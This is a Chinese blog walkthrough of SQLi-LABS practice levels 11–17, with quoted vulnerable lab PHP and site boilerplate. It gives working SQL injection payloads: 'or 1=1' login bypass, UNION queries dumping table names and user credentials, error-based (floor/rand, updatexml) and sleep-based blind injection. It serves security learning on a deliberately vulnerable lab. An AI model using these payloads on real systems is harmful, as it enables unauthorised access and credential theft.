+<h3 id="11-post-单字符注入"><a href="#11-post-单字符注入" class="headerlink" title="11.post-单字符注入"></a>11.post-单字符注入</h3><p>一个登录框</p>
+<p><img src="https://i.imgur.com/1dFEwzT.png" alt></p>
+<p>查看源代码，提交方式为post</p>
+<p><img src="https://i.imgur.com/eAJ6vpw.png" alt></p>
+<pre><code>select ... from ... where username=&apos;$username&apos; and password=&apos;$password&apos;</code></pre><p>在username与password中分别输入</p>
+<pre><code>1
+asdf</code></pre><p><img src="https://i.imgur.com/31q2k6g.png" alt></p>
+<p>提示登录失败</p>
+<p>再次输入</p>
+<pre><code>1&apos;
+asdf</code></pre><p><img src="https://i.imgur.com/0UrcjRq.png" alt></p>
+<p>发现报错语句中出现</p>
+<pre><code>asdf&apos; LIMIT 0,1</code></pre><p>则猜测为单字符注入，后台的查询语句为</p>
+<pre><code>SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1;</code></pre><p>输入后成为</p>
+<pre><code>WHERE username=&apos;1&apos;&apos; and password=&apos;asdf&apos; LIMIT 0,1;</code></pre><p>则使用or进行绕过，输入以下内容即可(post用#进行注释)：</p>
+<pre><code>1&apos;or 1=1#
+asdf #随意密码</code></pre><p>此时查询语句为</p>
+<p><img src="https://i.imgur.com/YQXi6MQ.png" alt></p>
+<p>即用or 1=1 绕过username，并用注释#绕过password</p>
+<p>登录进去了，由于LIMIT 0,1，查询到了表的第一条，那么现在输入：</p>
+<pre><code>1&apos;or 1=1 order by 2#
+asdf</code></pre><p>发现正常，继续：</p>
+<pre><code>1&apos;or 1=1 order by 3#
+asdf</code></pre><p>报错，则主查询有两列，构造：</p>
+<pre><code>1&apos;or 1=1 union select 1,database()#
+asdf</code></pre><p>但是查询出来的仍是Dumb，因为or 1=1 将所有数据查询出来，但只有一个显示位，显示首位</p>
+<p><img src="https://i.imgur.com/5iPvxJV.png" alt></p>
+<p>那么要获取剩下的数据呢？</p>
+<p>则可加上limit语句</p>
+<pre><code>1&apos;or 1=1 union select 1,database() limit 0,1#
+asdf</code></pre><p>由于or 1=1 永真，会将所有数据查询，union后会将联合查询的数据加入到主查询数据的后面，则不断改变limit的值，最后一个数据即为联合查询的数据库名</p>
+<p>查到13时，</p>
+<pre><code>1&apos;or 1=1 union select 1,database() limit 13,1#
+asdf</code></pre><p><img src="https://i.imgur.com/47Ek5ct.png" alt></p>
+<p>第14会报错，则说明当前数据库为security,说明username与password的数据有12行</p>
+<p>进行查表</p>
+<pre><code>1&apos;or 1=1 union select 1,table_name from information_schema.tables where table_schema=&apos;security&apos; limit 13,1#
+asdf</code></pre><p>可查出第一个表，13增大获取剩下的表，到16时得到users的表，也为最后一个表</p>
+<p>接下来获取字段，构造：</p>
+<pre><code>1&apos;or 1=1 union select 1,column_name from information_schema.columns where table_name=&apos;users&apos; limit 13,1#
+asdf</code></pre><p>得到id字段，13改为14得到username字段，改为15得到password字段，改为16报错</p>
+<p>接下来进行查询用户名和密码数据：</p>
+<pre><code>1&apos;or 1=1 union select username,password from users limit 0,1#
+asdf</code></pre><p>…</p>
+<h3 id="12-post-双引号-括号注入"><a href="#12-post-双引号-括号注入" class="headerlink" title="12.post-双引号+括号注入"></a>12.post-双引号+括号注入</h3><p>构造</p>
+<pre><code>1&apos;
+asdf</code></pre><p>不报错，登陆失败，则将’改成”</p>
+<pre><code>1&quot;
+asdf</code></pre><p>引起报错</p>
+<p><img src="https://i.imgur.com/bq2J1Zk.png" alt></p>
+<p>还出现了括号，则构造</p>
+<pre><code>1&quot;)or 1=1#
+asdf</code></pre><p>即成功登录，并显示了返回的信息，注入同11题</p>
+<h3 id="13-post-双查询注入"><a href="#13-post-双查询注入" class="headerlink" title="13.post-双查询注入"></a>13.post-双查询注入</h3><p>构造</p>
+<pre><code>1&apos;
+asdf</code></pre><p><img src="https://i.imgur.com/tei5BE0.png" alt></p>
+<p>则构造</p>
+<pre><code>1&apos;)or 1=1#
+asdf</code></pre><p>发现登录成功，但无返回的信息，既然有返回的报错信息，那就用双查询注入，构造</p>
+<pre><code>1
+1&apos;)or 1=1 union select count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#</code></pre><p>多登录几次，爆出错误，得到了当前数据库名</p>
+<p><img src="https://i.imgur.com/a4vgygX.png" alt></p>
+<p>剩下的爆表、字段…即可按照第5题的方法做</p>
+<h3 id="14-post-双查询注入-双引号"><a href="#14-post-双查询注入-双引号" class="headerlink" title="14.post-双查询注入-双引号"></a>14.post-双查询注入-双引号</h3><p>上题是单引号引起报错，并需要括号闭合进行注入，这道题双引号引起报错，构造</p>
+<pre><code>1
+1&quot;or 1=1 union select count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#</code></pre><p>…</p>
+<h3 id="15-post-基于布尔型-时间型盲注"><a href="#15-post-基于布尔型-时间型盲注" class="headerlink" title="15.post-基于布尔型/时间型盲注"></a>15.post-基于布尔型/时间型盲注</h3><p>构造</p>
+<pre><code>1
+1&apos;</code></pre><p>出现登录失败，但未显示错误，尝试双引号仍失败、无错误，构造</p>
+<pre><code>1
+1&apos;or 1=1#</code></pre><p>可成功登录，但无信息</p>
+<p>由于页面只有登录成功、登录失败两种状态，无报错，无登陆成功后的查询信息</p>
+<p>但是页面中区分登录成功与失败的标志就是页面上的图片，查看源代码找到了登录成功显示的图片名为’flag.jpg’，登录失败后的图片名为’slap.jpg’，则可根据页面是否有关键字’flag.jpg’来判定，进行布尔盲注，当然，也可以进行时间盲注</p>
+<h3 id="16-post-基于布尔型-时间型盲注"><a href="#16-post-基于布尔型-时间型盲注" class="headerlink" title="16.post-基于布尔型/时间型盲注"></a>16.post-基于布尔型/时间型盲注</h3><p>构造</p>
+<pre><code>1
+1&apos;</code></pre><p>登陆失败，无报错</p>
+<pre><code>1
+1&quot;</code></pre><p>登陆失败，无报错，进行绕过</p>
+<pre><code>1
+1&apos;or 1=1#</code></pre><p>登陆失败，无报错</p>
+<pre><code>1
+1&quot;or 1=1#</code></pre><p>登陆失败，无报错</p>
+<p>则使用sleep函数检测</p>
+<pre><code>1
+1&apos;or 1=1 and if(length((select database()))&gt;5,sleep(5),0)</code></pre><p>不成功，继续测试：</p>
+<pre><code>1
+1&quot;or 1=1 and if(length((select database()))&gt;5,sleep(5),0)</code></pre><p>不成功，继续测试：</p>
+<pre><code>1
+1&apos;)or 1=1 and if(length((select database()))&gt;5,sleep(5),0)</code></pre><p>不成功，继续测试：</p>
+<pre><code>1
+1&quot;)or 1=1 and if(length((select database()))&gt;5,sleep(5),0)</code></pre><p>成功！页面响应超级慢</p>
+<p>即可进行盲注</p>
+<h3 id="17-post-reset-password"><a href="#17-post-reset-password" class="headerlink" title="17.post-reset password"></a>17.post-reset password</h3><p>从这题开始就与前面的题很不一样了，先分析php源代码</p>
+<p>首先看check_input这个函数，传入一个变量$value，如果不为空则进行截取前15位</p>
+<pre><code>function check_input($value)
+    {
+    if(!empty($value))
+        {
+        // truncation (see comments)
+        $value = substr($value,0,15);
+        }
+
+        // Stripslashes if magic quotes enabled
+        if (get_magic_quotes_gpc())
+            {
+            $value = stripslashes($value);
+            }
+
+        // Quote if not a number
+        if (!ctype_digit($value))
+            {
+            $value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;
+            }
+
+    else
+        {
+        $value = intval($value);
+        }
+    return $value;
+    }</code></pre><p>接下来，如果post传来了uname与passwd参数，则将uname传入check_input函数中，将返回值赋值给$uname，将passwd参数的值赋值给$passwd</p>
+<pre><code>// take the variables
+if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;]))
+
+{
+//making sure uname is not injectable
+$uname=check_input($_POST[&apos;uname&apos;]);  
+
+$passwd=$_POST[&apos;passwd&apos;];
+
+
+//logging the connection parameters to a file for analysis.
+$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);
+fwrite($fp,&apos;User Name:&apos;.$uname.&quot;\n&quot;);
+fwrite($fp,&apos;New Password:&apos;.$passwd.&quot;\n&quot;);
+fclose($fp);</code></pre><p>之后进行执行SQL语句查询用户名</p>
+<p>如果查到了，则会执行update语句，将用户名的密码设置为传进来密码，如果执行出错，则会输出错误，如果未出错，则什么都不会输出；最后会输出一张图片” You password has been successfully updated “ ;    </p>
+<p>如果未查到用户名，则会输出一张图片”Bug off you Silly Dumb hacker”;</p>
+<pre><code>// connectivity 
+@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;
+
+$result=mysql_query($sql);
+$row = mysql_fetch_array($result);
+//echo $row;
+    if($row)
+    {
+          //echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;;    
+        $row1 = $row[&apos;username&apos;];      
+        //echo &apos;Your Login name:&apos;. $row1;
+        $update=&quot;UPDATE users SET password = &apos;$passwd&apos; WHERE username=&apos;$row1&apos;&quot;;
+        mysql_query($update);
+          echo &quot;&lt;br&gt;&quot;;
+
+        if (mysql_error())
+        {
+            echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;;
+            print_r(mysql_error());
+            echo &quot;&lt;/br&gt;&lt;/br&gt;&quot;;
+            echo &quot;&lt;/font&gt;&quot;;
+        }
+        else
+        {
+            echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;;
+            //echo &quot; You password has been successfully updated &quot; ;        
+            echo &quot;&lt;br&gt;&quot;;
+            echo &quot;&lt;/font&gt;&quot;;
+        }
+
+        echo &apos;&lt;img src=&quot;../images/flag1.jpg&quot;   /&gt;&apos;;    
+        //echo &apos;Your Password:&apos; .$row[&apos;password&apos;];
+          echo &quot;&lt;/font&gt;&quot;;
+
+      }
+    else  
+    {
+        echo &apos;&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;&apos;;
+        //echo &quot;Bug off you Silly Dumb hacker&quot;;
+        echo &quot;&lt;/br&gt;&quot;;
+        echo &apos;&lt;img src=&quot;../images/slap1.jpg&quot;   /&gt;&apos;;
+
+        echo &quot;&lt;/font&gt;&quot;;  
+    }
+}</code></pre><p>即：</p>
+<pre><code>1.输入的用户名必须要存在
+2.只能利用报错语句输出查询信息</code></pre><p>经过测试，发现admin这个用户是正确的用户，构造</p>
+<pre><code>admin
+1&apos;</code></pre><p>出现了错误</p>
+<p><img src="https://i.imgur.com/MlQEUiT.png" alt></p>
+<p>则为单引号注入</p>
+<p>进行报错注入：</p>
+<p>参考</p>
+<pre><code>https://blog.csdn.net/zpy1998zpy/article/details/80631036</code></pre><p>了解到使用下列两种函数</p>
+<pre><code>updatexml(目标xml文档，xml路径，更新的内容) # 更新xml文档
+
+extractvalue(目标xml文档，xml路径) # 对xml文档进行查询</code></pre><p>了解了一下XML</p>
+<p><img src="https://i.imgur.com/GVIiEZQ.png" alt></p>
+<p>使用这两个函数时，即使查询不到目标xml文档、xml路径也不会报错，但xml路径格式写错了就会报错，并返回写入的错误语句的内容</p>
+<p><img src="https://i.imgur.com/AGTG4Ms.png" alt></p>
+<p>现在构造</p>
+<pre><code>admin
+1&apos; and updatexml(1,concat(&apos;~&apos;,(select database())),1)#
+// 1&apos; and extractvalue(1,concat(&apos;~&apos;,(select database())))#</code></pre><p><img src="https://i.imgur.com/ctFOLJd.png" alt></p>
+<p>之后更改xpath的值就可以进一步查询了</p>
+<h2 id="SQL盲注脚本"><a href="#SQL盲注脚本" class="headerlink" title="SQL盲注脚本"></a>SQL盲注脚本</h2><p>思路：</p>
+<pre><code>获取数据库名长度-获取数据库名-获取表名长度-获取表名-获取每个表中字段名
+根据字段名和表名获取数据信息</code></pre><p>布尔型：</p>
+<pre><code>主要利用substr函数(mid)进行名称的逐位ascii码比较，根据页面是否有关键字来判定是否为正确信息</code></pre><p>时间型：</p>
+<pre><code>主要利用if和sleep函数，若正确则页面响应sleep的时间，此时会响应出错
+则用python的try和except进行判断，若出错则信息正确</code></pre><p>POST:</p>
+<pre><code>与布尔型方法一样，由于有username与password两部分输入，要多输入一个值
+输入值的时候要符合HTML的输入框的键名</code></pre>
+      
+    </div>
+    
+    
+    
+
+  <div>
+    
+      ﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+    
+  </div>
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.jpg" alt="gtfly 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/aipay.jpg" alt="gtfly 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    gtfly
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2018/10/24/SQLi-LABS-wp/" title="SQLi LABS wp">http://yoursite.com/2018/10/24/SQLi-LABS-wp/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/19/php类与对象/" rel="next" title="php类与对象">
+                <i class="fa fa-chevron-left"></i> php类与对象
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/10/31/栈-回文判断/" rel="prev" title="栈-回文判断">
+                栈-回文判断 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">gtfly</p>
+              <p class="site-description motion-element" itemprop="description">轻描时光漫长低唱语焉不详.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">148</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ctf.bugku.com/login?next=challenges" title="Bugku" target="_blank">Bugku</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://new.bugku.com/" title="new Bugku" target="_blank">new Bugku</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.linkedbyx.com/home" title="X计划平台" target="_blank">X计划平台</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.shiyanbar.com/ctf/practice" title="实验吧" target="_blank">实验吧</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ctf.jasec.cn/index.php?page=login" title="Jactf" target="_blank">Jactf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.jarvisoj.com/login" title="Javis" target="_blank">Javis</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cgctf.nuptsast.com/challenges#Web" title="CGctf" target="_blank">CGctf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xz.aliyun.com/" title="先知社区" target="_blank">先知社区</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ctf.ssleye.com/" title="ctf在线工具" target="_blank">ctf在线工具</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ctf.194nb.com/" title="aman ctf在线工具" target="_blank">aman ctf在线工具</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ctfwp.com/" title="ctfwp" target="_blank">ctfwp</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://skysec.top/" title="一叶飘零" target="_blank">一叶飘零</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.leavesongs.com/" title="离别歌" target="_blank">离别歌</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLi-LABS"><span class="nav-number">1.</span> <span class="nav-text">SQLi LABS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-单字符注入"><span class="nav-number">1.1.</span> <span class="nav-text">1.单字符注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-数字型注入"><span class="nav-number">1.2.</span> <span class="nav-text">2.数字型注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-加括号的注入"><span class="nav-number">1.3.</span> <span class="nav-text">3.加括号的注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-双引号的字符型注入-括号"><span class="nav-number">1.4.</span> <span class="nav-text">4.双引号的字符型注入+括号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-双查询注入"><span class="nav-number">1.5.</span> <span class="nav-text">5.双查询注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-双引号双查询注入"><span class="nav-number">1.6.</span> <span class="nav-text">6.双引号双查询注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-导出注入"><span class="nav-number">1.7.</span> <span class="nav-text">7.导出注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-布尔型盲注"><span class="nav-number">1.8.</span> <span class="nav-text">8.布尔型盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-基于时间的盲注"><span class="nav-number">1.9.</span> <span class="nav-text">9.基于时间的盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-基于时间的盲注-双引号"><span class="nav-number">1.10.</span> <span class="nav-text">10.基于时间的盲注-双引号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-post-单字符注入"><span class="nav-number">1.11.</span> <span class="nav-text">11.post-单字符注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-post-双引号-括号注入"><span class="nav-number">1.12.</span> <span class="nav-text">12.post-双引号+括号注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-post-双查询注入"><span class="nav-number">1.13.</span> <span class="nav-text">13.post-双查询注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#14-post-双查询注入-双引号"><span class="nav-number">1.14.</span> <span class="nav-text">14.post-双查询注入-双引号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#15-post-基于布尔型-时间型盲注"><span class="nav-number">1.15.</span> <span class="nav-text">15.post-基于布尔型/时间型盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#16-post-基于布尔型-时间型盲注"><span class="nav-number">1.16.</span> <span class="nav-text">16.post-基于布尔型/时间型盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#17-post-reset-password"><span class="nav-number">1.17.</span> <span class="nav-text">17.post-reset password</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL盲注脚本"><span class="nav-number">2.</span> <span class="nav-text">SQL盲注脚本</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        ﻿<div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="heart">
+    <i class="fa fa-heart" aria-hidden="true"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">gtfly</span>
+
+ <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+ <script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("07/16/2018 12:49:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "已存在 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+ setInterval("createtime()",250);
+ </script>
+
+<!--
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count"></span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+-->
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </div></footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '9Pgz8ir0b40IXQ5V3bjRc8m0-gzGzoHsz',
+        appKey: 'VCCuCSQHpPqX3hmOh0PlmfXu',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
